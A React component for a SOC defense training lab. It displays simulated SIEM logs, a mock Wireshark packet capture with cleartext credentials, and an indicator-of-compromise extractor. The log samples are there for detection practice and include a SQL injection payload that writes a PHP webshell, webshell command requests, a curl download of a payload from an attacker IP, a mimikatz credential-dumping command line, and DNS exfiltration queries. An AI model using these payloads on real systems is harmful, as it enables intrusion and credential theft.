import React, { useState, useMemo } from 'react';
import { useAuth } from '../../context/AuthContext';

const SOC_SCENARIOS = {
    ad_pth: {
        name: 'Active Directory: Pass-the-Hash & DCSync',
        category: 'Windows Event Logs',
        desc: 'Adversary uses extracted NTLM hash to authenticate remotely and trigger DCSync replication.',
        mitre: ['T1550.002', 'T1003.006'],
        logs: [
            { time: '2026-08-23 03:14:02', source: 'Security.evtx', eventId: '4624', level: 'WARN', host: 'DC01.CORP.LOCAL', msg: 'An account was successfully logged on. Account Name: svc_backup. Logon Type: 3 (Network). Authentication Package: NTLM (No Kerberos Ticket). Source IP: 10.10.11.15' },
            { time: '2026-08-23 03:14:05', source: 'Security.evtx', eventId: '4672', level: 'HIGH', host: 'DC01.CORP.LOCAL', msg: 'Special privileges assigned to new logon. Privileges: SeSecurityPrivilege, SeBackupPrivilege, SeDebugPrivilege. Account: svc_backup' },
            { time: '2026-08-23 03:14:18', source: 'Security.evtx', eventId: '5136', level: 'CRITICAL', host: 'DC01.CORP.LOCAL', msg: 'A directory service object was modified. DS-Replication-Get-Changes-All rights invoked. Target: Domain-DNS. Actor: svc_backup (DCSync abuse suspected)' },
            { time: '2026-08-23 03:14:40', source: 'Security.evtx', eventId: '4769', level: 'WARN', host: 'DC01.CORP.LOCAL', msg: 'A Kerberos service ticket was requested. Service Name: krbtgt. Ticket Encryption Type: 0x17 (RC4-HMAC weak downgrade). Client Address: 10.10.11.15' }
        ]
    },
    web_rce: {
        name: 'Web Server: SQLi to Webshell Execution',
        category: 'Web & Auditd Logs',
        desc: 'Web application compromised via SQL injection leading to file upload and PHP web shell interactive commands.',
        mitre: ['T1190', 'T1505.003', 'T1059.004'],
        logs: [
            { time: '2026-08-23 04:02:11', source: 'nginx/access.log', eventId: 'HTTP', level: 'WARN', host: 'web-front-01', msg: 'GET /search.php?q=test%27%20UNION%20SELECT%20null,%20%27%3C?php%20system($_GET[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/uploads/shell.php%27--%20- HTTP/1.1 200 (IP: 198.51.100.42)' },
            { time: '2026-08-23 04:02:25', source: 'nginx/access.log', eventId: 'HTTP', level: 'CRITICAL', host: 'web-front-01', msg: 'POST /uploads/shell.php?cmd=whoami HTTP/1.1 200 Response: "www-data" (IP: 198.51.100.42)' },
            { time: '2026-08-23 04:02:38', source: 'auditd.log', eventId: 'SYSCALL', level: 'CRITICAL', host: 'web-front-01', msg: 'type=SYSCALL arch=c000003e syscall=59 (execve) success=yes exit=0 ppid=1420 pid=28492 comm="sh" exe="/bin/dash" subj=system_u:system_r:httpd_t' },
            { time: '2026-08-23 04:03:01', source: 'auditd.log', eventId: 'SYSCALL', level: 'CRITICAL', host: 'web-front-01', msg: 'type=EXECVE a0="curl" a1="-s" a2="http://198.51.100.42/payload.bin" a3="-o" a4="/tmp/.c2"' }
        ]
    },
    lsass_dump: {
        name: 'Endpoint: Sysmon LSASS Credential Theft',
        category: 'Sysmon Telemetry',
        desc: 'Adversary injects into or accesses LSASS memory to harvest cleartext passwords and Kerberos tickets.',
        mitre: ['T1003.001', 'T1055'],
        logs: [
            { time: '2026-08-23 05:20:10', source: 'Sysmon/Operational', eventId: '1', level: 'WARN', host: 'WS-FIN-01', msg: 'Process Create: Image: C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimikatz.exe. CommandLine: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' },
            { time: '2026-08-23 05:20:12', source: 'Sysmon/Operational', eventId: '10', level: 'CRITICAL', host: 'WS-FIN-01', msg: 'Process Access: SourceImage: C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimikatz.exe TargetImage: C:\\Windows\\System32\\lsass.exe GrantedAccess: 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION) CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb14' },
            { time: '2026-08-23 05:20:18', source: 'Sysmon/Operational', eventId: '11', level: 'HIGH', host: 'WS-FIN-01', msg: 'File Create: TargetFilename: C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp CreationUtcTime: 2026-08-23 05:20:18' }
        ]
    },
    dns_c2: {
        name: 'Network: Zeek DNS Tunneling & C2 Exfiltration',
        category: 'Zeek Network Telemetry',
        desc: 'Adversary uses base32-encoded subdomains over high-frequency DNS queries to covertly exfiltrate credentials.',
        mitre: ['T1071.004', 'T1048.003'],
        logs: [
            { time: '2026-08-23 06:10:01', source: 'zeek/dns.log', eventId: 'DNS_QUERY', level: 'WARN', host: 'GATEWAY-01', msg: 'uid=C9x811 proto=udp id.orig_h=10.10.11.80 query="a7f839c01a.c2.darknet.co" qtype_name=TXT answers=["OK"] (High Entropy 4.82)' },
            { time: '2026-08-23 06:10:03', source: 'zeek/dns.log', eventId: 'DNS_QUERY', level: 'HIGH', host: 'GATEWAY-01', msg: 'uid=C9x812 proto=udp id.orig_h=10.10.11.80 query="b89230fae91823.c2.darknet.co" qtype_name=TXT answers=["OK"] (High Entropy 5.12)' },
            { time: '2026-08-23 06:10:05', source: 'zeek/dns.log', eventId: 'DNS_QUERY', level: 'CRITICAL', host: 'GATEWAY-01', msg: 'uid=C9x813 proto=udp id.orig_h=10.10.11.80 query="exfil.passwords.hash.ntlm.c2.darknet.co" qtype_name=NULL (Beacon Interval: 2.0s Jitter: 0%)' }
        ]
    }
};

const PCAP_SAMPLES = [
    {
        no: 1,
        time: '0.000000',
        src: '192.168.1.105:54120',
        dst: '10.10.10.50:80',
        proto: 'TCP',
        len: 74,
        info: '54120 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256',
        l2: { srcMac: '00:0c:29:8a:41:20', dstMac: '00:50:56:c0:00:08', ethType: '0x0800 (IPv4)' },
        l3: { ver: 'IPv4', ttl: 64, srcIp: '192.168.1.105', dstIp: '10.10.10.50', proto: 'TCP (6)' },
        l4: { srcPort: 54120, dstPort: 80, flags: 'SYN', seq: 0, ack: 0, win: 64240 },
        payload: null
    },
    {
        no: 2,
        time: '0.000412',
        src: '10.10.10.50:80',
        dst: '192.168.1.105:54120',
        proto: 'TCP',
        len: 74,
        info: '80 → 54120 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460',
        l2: { srcMac: '00:50:56:c0:00:08', dstMac: '00:0c:29:8a:41:20', ethType: '0x0800 (IPv4)' },
        l3: { ver: 'IPv4', ttl: 64, srcIp: '10.10.10.50', dstIp: '192.168.1.105', proto: 'TCP (6)' },
        l4: { srcPort: 80, dstPort: 54120, flags: 'SYN, ACK', seq: 0, ack: 1, win: 65160 },
        payload: null
    },
    {
        no: 3,
        time: '0.000550',
        src: '192.168.1.105:54120',
        dst: '10.10.10.50:80',
        proto: 'TCP',
        len: 66,
        info: '54120 → 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0',
        l2: { srcMac: '00:0c:29:8a:41:20', dstMac: '00:50:56:c0:00:08', ethType: '0x0800 (IPv4)' },
        l3: { ver: 'IPv4', ttl: 64, srcIp: '192.168.1.105', dstIp: '10.10.10.50', proto: 'TCP (6)' },
        l4: { srcPort: 54120, dstPort: 80, flags: 'ACK', seq: 1, ack: 1, win: 64240 },
        payload: null
    },
    {
        no: 4,
        time: '0.001890',
        src: '192.168.1.105:54120',
        dst: '10.10.10.50:80',
        proto: 'HTTP',
        len: 428,
        info: 'POST /auth/login.php HTTP/1.1 (application/x-www-form-urlencoded)',
        l2: { srcMac: '00:0c:29:8a:41:20', dstMac: '00:50:56:c0:00:08', ethType: '0x0800 (IPv4)' },
        l3: { ver: 'IPv4', ttl: 64, srcIp: '192.168.1.105', dstIp: '10.10.10.50', proto: 'TCP (6)' },
        l4: { srcPort: 54120, dstPort: 80, flags: 'PSH, ACK', seq: 1, ack: 1, win: 64240 },
        payload: `POST /auth/login.php HTTP/1.1\r\nHost: 10.10.10.50\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 46\r\n\r\nusername=admin&password=Summer2026!&submit=Login`
    },
    {
        no: 5,
        time: '0.004120',
        src: '10.10.10.50:80',
        dst: '192.168.1.105:54120',
        proto: 'HTTP',
        len: 298,
        info: 'HTTP/1.1 302 Found (Set-Cookie: session_token=ehk_admin_sec_99482)',
        l2: { srcMac: '00:50:56:c0:00:08', dstMac: '00:0c:29:8a:41:20', ethType: '0x0800 (IPv4)' },
        l3: { ver: 'IPv4', ttl: 64, srcIp: '10.10.10.50', dstIp: '192.168.1.105', proto: 'TCP (6)' },
        l4: { srcPort: 80, dstPort: 54120, flags: 'PSH, ACK', seq: 1, ack: 363, win: 65160 },
        payload: `HTTP/1.1 302 Found\r\nLocation: /admin/dashboard.php\r\nSet-Cookie: session_token=ehk_admin_sec_99482; Path=/\r\nContent-Length: 0\r\n\r\n`
    }
];

export default function SocLogHunterTab() {
    const { playChime } = useAuth();
    const [viewMode, setViewMode] = useState('telemetry'); // 'telemetry' or 'pcap'
    const [selectedScenarioKey, setSelectedScenarioKey] = useState('ad_pth');
    const [search, setSearch] = useState('');
    const [filterLevel, setFilterLevel] = useState('ALL');
    const [extractedIocs, setExtractedIocs] = useState(null);

    // PCAP packet state
    const [selectedPacket, setSelectedPacket] = useState(PCAP_SAMPLES[3]);
    const [showStreamModal, setShowStreamModal] = useState(false);

    const activeScenario = SOC_SCENARIOS[selectedScenarioKey];

    const filteredLogs = useMemo(() => {
        return activeScenario.logs.filter(log => {
            if (filterLevel !== 'ALL' && log.level !== filterLevel) return false;
            if (!search) return true;
            const q = search.toLowerCase();
            return (
                log.msg.toLowerCase().includes(q) ||
                log.source.toLowerCase().includes(q) ||
                log.eventId.toLowerCase().includes(q) ||
                log.host.toLowerCase().includes(q)
            );
        });
    }, [activeScenario, search, filterLevel]);

    const handleExtractIocs = () => {
        const fullText = activeScenario.logs.map(l => l.msg + ' ' + l.host).join(' ');
        const ipRegex = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g;
        const ips = Array.from(new Set(fullText.match(ipRegex) || []));
        const domainRegex = /\b[a-zA-Z0-9.-]+\.(?:com|co|local|org|internal)\b/g;
        const domains = Array.from(new Set(fullText.match(domainRegex) || []));
        const processRegex = /\b[\w-]+\.(?:exe|bin|php|sh|dmp)\b/g;
        const processes = Array.from(new Set(fullText.match(processRegex) || []));

        setExtractedIocs({ ips, domains, processes });
        playChime();
    };

    return (
        <div className="tab-panel active">
            {/* Header Hub Card */}
            <div className="glass-card mb-25" style={{ background: 'linear-gradient(135deg, rgba(6, 182, 212, 0.06) 0%, rgba(59, 130, 246, 0.06) 100%)', borderColor: 'rgba(6, 182, 212, 0.3)' }}>
                <div className="flex-space-between-center flex-wrap gap-15">
                    <div>
                        <div className="projects-badge-tag" style={{ background: 'rgba(6, 182, 212, 0.15)', color: '#22d3ee' }}>
                            SOC DEFENSE & THREAT HUNTING LAB
                        </div>
                        <h2 style={{ margin: '4px 0 2px 0' }}>SIEM Telemetry & Wireshark PCAP Packet Dissector</h2>
                        <p style={{ color: 'var(--text-secondary)', fontSize: '0.92rem' }}>
                            Investigate intrusion telemetry (Sysmon, Windows EVTX, Zeek), dissect raw Layer 2-7 PCAP packet headers, and reconstruct TCP credential streams.
                        </p>
                    </div>

                    <div className="ai-nav-chips">
                        <button className={`ai-nav-btn ${viewMode === 'telemetry' ? 'active' : ''}`} onClick={() => { setViewMode('telemetry'); playChime(); }}>
                            SIEM Log Telemetry
                        </button>
                        <button className={`ai-nav-btn ${viewMode === 'pcap' ? 'active' : ''}`} onClick={() => { setViewMode('pcap'); playChime(); }}>
                            Wireshark PCAP Dissector
                        </button>
                    </div>
                </div>

                {viewMode === 'telemetry' && (
                    <div className="mt-20 flex-space-between-center flex-wrap gap-10">
                        <div className="ai-nav-chips">
                            {Object.entries(SOC_SCENARIOS).map(([k, v]) => (
                                <button
                                    key={k}
                                    className={`ai-nav-btn ${selectedScenarioKey === k ? 'active' : ''}`}
                                    onClick={() => { setSelectedScenarioKey(k); setSearch(''); setExtractedIocs(null); playChime(); }}
                                >
                                    {v.name.split(':')[0]}
                                </button>
                            ))}
                        </div>
                    </div>
                )}
            </div>

            {/* 1. SIEM Log Telemetry Mode */}
            {viewMode === 'telemetry' && (
                <>
                    {/* Hunting Controls & Search */}
                    <div className="glass-card mb-20">
                        <div className="flex-space-between-center flex-wrap gap-15">
                            <div className="flex-gap-10 flex-wrap" style={{ flex: 1 }}>
                                <input
                                    type="text"
                                    className="search-input"
                                    style={{ minWidth: '300px', flex: 1 }}
                                    placeholder="Search event ID (e.g. 4624, 10), process name, source IP, or query..."
                                    value={search}
                                    onChange={(e) => setSearch(e.target.value)}
                                />
                                <select
                                    className="domain-select"
                                    value={filterLevel}
                                    onChange={(e) => setFilterLevel(e.target.value)}
                                >
                                    <option value="ALL">All Severity Levels</option>
                                    <option value="CRITICAL">CRITICAL</option>
                                    <option value="HIGH">HIGH</option>
                                    <option value="WARN">WARN</option>
                                </select>
                            </div>

                            <div className="flex-gap-10">
                                <button className="site-btn tool-btn" onClick={handleExtractIocs}>
                                    Extract IOCs
                                </button>
                            </div>
                        </div>

                        {extractedIocs && (
                            <div className="mt-15 p-12 glass-card" style={{ background: 'rgba(0, 0, 0, 0.4)', margin: 0, borderColor: 'rgba(34, 197, 94, 0.3)' }}>
                                <div className="flex-space-between-center mb-8">
                                    <span className="projects-badge-tag" style={{ background: 'rgba(34, 197, 94, 0.15)', color: '#4ade80' }}>
                                        EXTRACTED INDICATORS OF COMPROMISE (IOCs)
                                    </span>
                                </div>
                                <div className="overview-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px' }}>
                                    <div>
                                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>IP ADDRESSES:</span>
                                        <div className="flex-gap-6 flex-wrap mt-4">
                                            {extractedIocs.ips.map(ip => <code key={ip} style={{ color: '#38bdf8', fontSize: '0.78rem', background: 'rgba(255,255,255,0.05)', padding: '2px 6px', borderRadius: '4px' }}>{ip}</code>)}
                                        </div>
                                    </div>
                                    <div>
                                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>DOMAINS / HOSTS:</span>
                                        <div className="flex-gap-6 flex-wrap mt-4">
                                            {extractedIocs.domains.map(d => <code key={d} style={{ color: '#fde047', fontSize: '0.78rem', background: 'rgba(255,255,255,0.05)', padding: '2px 6px', borderRadius: '4px' }}>{d}</code>)}
                                        </div>
                                    </div>
                                    <div>
                                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>PROCESSES / ARTIFACTS:</span>
                                        <div className="flex-gap-6 flex-wrap mt-4">
                                            {extractedIocs.processes.map(p => <code key={p} style={{ color: '#f87171', fontSize: '0.78rem', background: 'rgba(255,255,255,0.05)', padding: '2px 6px', borderRadius: '4px' }}>{p}</code>)}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>

                    {/* Live Telemetry Log Stream Table */}
                    <div className="glass-card mb-20">
                        <div className="flex-space-between-center mb-15">
                            <h3 className="tool-section-title" style={{ margin: 0 }}>Live Telemetry Stream ({filteredLogs.length} Events)</h3>
                            <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>Format: SIEM Raw Telemetry Feed</span>
                        </div>

                        <div className="flex-column gap-10">
                            {filteredLogs.map((log, idx) => (
                                <div
                                    key={idx}
                                    className="glass-card"
                                    style={{
                                        margin: 0,
                                        padding: '12px 16px',
                                        borderColor: log.level === 'CRITICAL' ? 'rgba(239, 68, 68, 0.4)' : log.level === 'HIGH' ? 'rgba(249, 115, 22, 0.4)' : 'rgba(234, 179, 8, 0.3)',
                                        background: log.level === 'CRITICAL' ? 'linear-gradient(90deg, rgba(239, 68, 68, 0.08) 0%, rgba(13, 20, 36, 0.7) 100%)' : 'rgba(13, 20, 36, 0.7)'
                                    }}
                                >
                                    <div className="flex-space-between-center flex-wrap gap-8 mb-6">
                                        <div className="flex-gap-8 align-center">
                                            <span className="channel-badge" style={{ background: 'rgba(255,255,255,0.08)', color: '#94a3b8', fontSize: '0.75rem' }}>
                                                {log.time}
                                            </span>
                                            <span className="projects-badge-tag" style={{ fontSize: '0.72rem' }}>{log.source}</span>
                                            <span style={{ fontFamily: 'monospace', fontSize: '0.78rem', color: '#38bdf8' }}>ID: {log.eventId}</span>
                                            <span style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>Host: <strong style={{ color: '#e2e8f0' }}>{log.host}</strong></span>
                                        </div>
                                        <span className={`cvss-score-pill cvss-${log.level === 'CRITICAL' ? 'critical' : log.level === 'HIGH' ? 'high' : 'medium'}`} style={{ fontSize: '0.72rem', padding: '2px 8px' }}>
                                            {log.level}
                                        </span>
                                    </div>
                                    <div className="tool-dir-cmd-box" style={{ wordBreak: 'break-all', fontSize: '0.82rem', lineHeight: 1.5, color: '#e2e8f0' }}>
                                        {log.msg}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* Visual Kill Chain Attack Timeline */}
                    <div className="glass-card">
                        <h3 className="tool-section-title mb-15">Attack Kill Chain Timeline Reconstruction</h3>
                        <div className="flex-column gap-12">
                            {activeScenario.logs.map((log, i) => (
                                <div key={i} className="flex-gap-15 align-center">
                                    <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: log.level === 'CRITICAL' ? '#ef4444' : log.level === 'HIGH' ? '#f97316' : '#eab308', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 'bold', fontSize: '0.8rem', color: '#000', flexShrink: 0 }}>
                                        0{i + 1}
                                    </div>
                                    <div className="glass-card" style={{ margin: 0, padding: '10px 14px', flex: 1, borderColor: 'rgba(255, 255, 255, 0.08)' }}>
                                        <div className="flex-space-between-center mb-4">
                                            <strong style={{ fontSize: '0.88rem', color: '#f8fafc' }}>{log.source} // Event {log.eventId}</strong>
                                            <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>{log.time}</span>
                                        </div>
                                        <p style={{ margin: 0, fontSize: '0.8rem', color: 'var(--text-secondary)' }}>
                                            {log.msg.length > 140 ? log.msg.substring(0, 140) + '...' : log.msg}
                                        </p>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </>
            )}

            {/* 2. Wireshark PCAP Packet Dissector Mode */}
            {viewMode === 'pcap' && (
                <div className="glass-card">
                    <div className="flex-space-between-center flex-wrap gap-15 mb-15">
                        <div>
                            <h3 className="tool-section-title" style={{ margin: 0 }}>Wireshark PCAP Packet Stream Analyzer</h3>
                            <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', margin: '4px 0 0 0' }}>
                                Real packet trace inspection with Layer 2 (Ethernet), Layer 3 (IPv4), Layer 4 (TCP), and Layer 7 (HTTP) dissections.
                            </p>
                        </div>
                        <button className="site-btn tool-btn" onClick={() => { setShowStreamModal(true); playChime(); }}>
                            Follow TCP Stream
                        </button>
                    </div>

                    {/* Packets Table */}
                    <div style={{ overflowX: 'auto', borderRadius: '8px', border: '1px solid rgba(255, 255, 255, 0.08)', marginBottom: '20px' }}>
                        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.82rem', fontFamily: 'monospace' }}>
                            <thead>
                                <tr style={{ background: 'rgba(2, 6, 12, 0.9)', color: '#94a3b8', borderBottom: '1px solid rgba(255, 255, 255, 0.08)' }}>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>No.</th>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>Time (s)</th>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>Source</th>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>Destination</th>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>Protocol</th>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>Length</th>
                                    <th style={{ padding: '8px 10px', textAlign: 'left' }}>Info</th>
                                </tr>
                            </thead>
                            <tbody>
                                {PCAP_SAMPLES.map(p => {
                                    const isSelected = selectedPacket?.no === p.no;
                                    const isHttp = p.proto === 'HTTP';
                                    return (
                                        <tr
                                            key={p.no}
                                            style={{
                                                background: isSelected ? 'rgba(6, 182, 212, 0.2)' : isHttp ? 'rgba(234, 179, 8, 0.08)' : 'transparent',
                                                borderBottom: '1px solid rgba(255, 255, 255, 0.04)',
                                                cursor: 'pointer'
                                            }}
                                            onClick={() => { setSelectedPacket(p); playChime(); }}
                                        >
                                            <td style={{ padding: '8px 10px', color: '#64748b' }}>{p.no}</td>
                                            <td style={{ padding: '8px 10px', color: '#94a3b8' }}>{p.time}</td>
                                            <td style={{ padding: '8px 10px', color: '#38bdf8' }}>{p.src}</td>
                                            <td style={{ padding: '8px 10px', color: '#a78bfa' }}>{p.dst}</td>
                                            <td style={{ padding: '8px 10px' }}>
                                                <span className="projects-badge-tag" style={{ fontSize: '0.7rem', padding: '1px 6px', background: isHttp ? 'rgba(234, 179, 8, 0.2)' : 'rgba(6, 182, 212, 0.15)', color: isHttp ? '#fde047' : '#22d3ee' }}>
                                                    {p.proto}
                                                </span>
                                            </td>
                                            <td style={{ padding: '8px 10px', color: '#cbd5e1' }}>{p.len}</td>
                                            <td style={{ padding: '8px 10px', color: isHttp ? '#fde047' : '#e2e8f0', whiteSpace: 'nowrap' }}>{p.info}</td>
                                        </tr>
                                    );
                                })}
                            </tbody>
                        </table>
                    </div>

                    {/* Dissection Details Pane */}
                    {selectedPacket && (
                        <div className="overview-grid" style={{ gridTemplateColumns: '1.2fr 1fr', gap: '20px' }}>
                            <div>
                                <span className="projects-badge-tag">LAYER 2-4 PACKET DISSECTION (FRAME #{selectedPacket.no})</span>
                                <div className="flex-column gap-8 mt-10">
                                    <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                        <strong style={{ color: '#38bdf8', fontSize: '0.85rem' }}>▼ Frame & Ethernet II</strong>
                                        <div style={{ fontSize: '0.78rem', color: '#cbd5e1', marginTop: '4px', fontFamily: 'monospace' }}>
                                            Source MAC: {selectedPacket.l2.srcMac} | Dest MAC: {selectedPacket.l2.dstMac} | EtherType: {selectedPacket.l2.ethType}
                                        </div>
                                    </div>
                                    <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                        <strong style={{ color: '#a78bfa', fontSize: '0.85rem' }}>▼ Internet Protocol Version 4 (IPv4)</strong>
                                        <div style={{ fontSize: '0.78rem', color: '#cbd5e1', marginTop: '4px', fontFamily: 'monospace' }}>
                                            Src: {selectedPacket.l3.srcIp} | Dst: {selectedPacket.l3.dstIp} | TTL: {selectedPacket.l3.ttl} | Protocol: {selectedPacket.l3.proto}
                                        </div>
                                    </div>
                                    <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                        <strong style={{ color: '#4ade80', fontSize: '0.85rem' }}>▼ Transmission Control Protocol (TCP)</strong>
                                        <div style={{ fontSize: '0.78rem', color: '#cbd5e1', marginTop: '4px', fontFamily: 'monospace' }}>
                                            Src Port: {selectedPacket.l4.srcPort} | Dst Port: {selectedPacket.l4.dstPort} | Flags: [{selectedPacket.l4.flags}] | Win: {selectedPacket.l4.win}
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div>
                                <span className="projects-badge-tag">LAYER 7 APPLICATION DATA & HEX DUMP</span>
                                <div className="ai-code-output-card mt-10">
                                    <pre className="modal-code-box" style={{ margin: 0, maxHeight: '180px', fontSize: '0.75rem', whiteSpace: 'pre-wrap', color: '#fde047' }}>
                                        <code>{selectedPacket.payload || '[No Application Layer Payload in TCP Handshake Packet]'}</code>
                                    </pre>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Follow TCP Stream Modal */}
                    {showStreamModal && (
                        <div className="modal-overlay active" onClick={() => setShowStreamModal(false)}>
                            <div className="dialog-modal-box" style={{ maxWidth: '640px' }} onClick={(e) => e.stopPropagation()}>
                                <div className="modal-header">
                                    <div>
                                        <span className="projects-badge-tag" style={{ background: 'rgba(234, 179, 8, 0.2)', color: '#fde047' }}>
                                            RECONSTRUCTED TCP STREAM (STREAM #0)
                                        </span>
                                        <h3 style={{ margin: '4px 0 0 0' }}>Follow TCP Stream: 192.168.1.105:54120 ⇄ 10.10.10.50:80</h3>
                                    </div>
                                    <button className="modal-close-btn" onClick={() => setShowStreamModal(false)}>×</button>
                                </div>

                                <div className="modal-body mt-15">
                                    <div className="code-editor-wrapper" style={{ background: '#020617', padding: '14px', borderRadius: '8px', fontSize: '0.8rem', lineHeight: 1.5, maxHeight: '320px', overflowY: 'auto' }}>
                                        {/* Client Request */}
                                        <div style={{ color: '#f87171', whiteSpace: 'pre-wrap', marginBottom: '12px' }}>
                                            {PCAP_SAMPLES[3].payload}
                                        </div>
                                        {/* Server Response */}
                                        <div style={{ color: '#38bdf8', whiteSpace: 'pre-wrap' }}>
                                            {PCAP_SAMPLES[4].payload}
                                        </div>
                                    </div>
                                    <div className="mt-12 project-mitigation-box" style={{ fontSize: '0.78rem' }}>
                                        ⚠️ <strong>Cleartext Credential Leak Detected:</strong> Intercepted credentials <code>username=admin</code> & <code>password=Summer2026!</code> transmitted over unencrypted HTTP (Port 80).
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            )}
        </div>
    );
}
